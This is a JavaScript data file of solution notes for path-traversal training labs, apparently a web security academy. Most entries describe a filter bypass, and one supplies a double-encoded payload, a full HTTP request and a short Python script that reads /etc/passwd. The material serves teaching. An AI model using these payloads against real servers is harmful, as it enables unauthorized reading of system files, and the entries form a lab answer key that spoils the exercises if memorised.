export default {
  'path-traversal-lab-simple': {
    note: 'The filename parameter is joined to an image directory with no validation; climb out with `../` to read `/etc/passwd`.'
  },
  'path-traversal-lab-absolute-path-bypass': {
    note: 'Traversal sequences are blocked, but a leading `/` makes the OS ignore the directory the code prepended.'
  },
  'path-traversal-lab-sequences-stripped-non-recursively': {
    note: '`../` is removed once, so `....//` collapses back into a traversal sequence after the strip.'
  },
  'path-traversal-lab-superfluous-url-decode': {
    note: 'The value is URL-decoded twice; double-encode the traversal so the filter sees `%2e%2e%2f` and the file API sees `../`.',
    work: {
      hints: [
        'The parameter is decoded before the filter and then decoded again before the file is opened. Count the decode layers.',
        'Encode `../` once for the transport and once for the application: `%252e%252e%252f`.',
        'Request `/image?filename=%252e%252e%252f%252e%252e%252fetc%252fpasswd` and read the response.'
      ],
      approach:
        'Two decode stages with a filter in between. The filter inspects a string that still contains percent escapes; the filesystem receives the decoded path. This is a decode-order bug, not a blocklist weakness.',
      request: `GET /image?filename=%252e%252e%252f%252e%252e%252fetc%252fpasswd HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION
Connection: close`,
      tokens: [
        ['%25', 'One percent-encoded percent sign. The first decode turns it into `%`, leaving `%2e` in the string.'],
        ['%2e', 'A percent-encoded dot. After the second decode it becomes `.`; the filter never sees a literal dot.'],
        ['%2f', 'A percent-encoded slash. The pair `%2e%2e%2f` only becomes `../` after two decodes.'],
        ['../ x2', 'Climbs from the image directory to the filesystem root.'],
        ['etc/passwd', 'A world-readable file used as proof of arbitrary file read.']
      ],
      script: `import sys, requests

host = sys.argv[1]
payload = "%252e%252e%252f%252e%252e%252fetc%252fpasswd"
r = requests.get(f"https://{host}/image", params={"filename": payload}, timeout=20)
print(r.status_code)
print("root:" in r.text and "read /etc/passwd" or "blocked")`
    }
  },
  'path-traversal-lab-validate-start-of-path': {
    note: 'The application requires the path to begin with the intended directory, so keep that prefix and traverse after it.'
  },
  'path-traversal-lab-validate-file-extension-null-byte-bypass': {
    note: 'The extension must be `.png`; a `%00` ends the C string at the filesystem call, discarding the appended extension.'
  }
}
